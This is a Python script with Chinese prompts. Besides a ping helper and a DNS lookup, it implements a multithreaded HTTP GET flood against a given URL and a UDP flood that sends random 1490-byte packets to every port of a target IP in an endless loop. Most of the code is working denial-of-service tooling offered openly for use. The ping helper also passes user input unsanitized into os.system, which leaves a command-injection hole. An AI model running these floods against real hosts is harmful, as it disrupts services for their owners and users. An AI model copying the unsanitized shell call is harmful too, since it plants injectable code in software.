import os,socket,threading,requests,meo,random

headers = {
    "User-Agent": meo.net.UserAgent.FIREFOX.value
}

# ping
def ping(host):
    if os.name == "nt": #判断系统版本
        times = 0
        i = 0
        answer = input("请选择Ping的模式:\n[1] 仅Ping一次\n[2] 指定Ping的次数\n[3] 无限Ping\n")
        if answer in ["1", "仅Ping一次"]:
            os.system("ping "+ host)
        elif answer in ["2", "指定Ping的次数"]:
            try:
                times = int(input("请指定Ping的次数 "))
            except:
                print("转换类型失败，默认5次")
                times = 5
            if times <= 0:
                print("数据错误，已恢复成5次")
                times = 5
            else:
                pass
            while i < times:
                os.system("ping "+ host)
                i += 1
        elif answer in ["3", "无限Ping"]:
            while True:
                os.system("ping "+ host)
    else:
        os.system("ping "+ host)

# 获取ip
def getip(name):
    try:
        print("ip:"+socket.gethostbyname(name))
    except:
        print("\a未检测到ip\n请检查网络是否正常或域名是否正确")



# 洪水攻击
def startattack(url, headers=headers):
    def attack(speed, collector = {}):
        for i in range(speed):
            try:
                r = requests.get(url, headers)
                collector['success'] += 1
            except:
                # print("发送失败")
                collector['err'] += speed - i
                break
    try:
        speed = int(input("请输入攻击速度(小心卡死自己):"))
    except:
        speed = 10
        print("未设置速度默认为10")
    collector = {
        "success": 0,
        "err": 0,
    }
    while True:
        t1 = threading.Thread(target=attack, args=(speed, collector))
        t1.start()
        print("\r已发送{}个包，失效{}个包".format(
            collector['success'] + collector['err'],
            collector['err']
        ), end="")

# ddos
def ddos_attack(ip):
    sent = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    meo.screen.red_font("注意！此功能极有可能耗尽你的宽带")
    port = int(input("请输入起始端口:"))
    while True:
        sock.sendto(bytes, (ip,port))
        sent = sent + 1
        port = port + 1
        print ("已发送 %s 个包到 %s 通过端口:%s"%(sent,ip,port))
        if port == 65534:
            port = 1

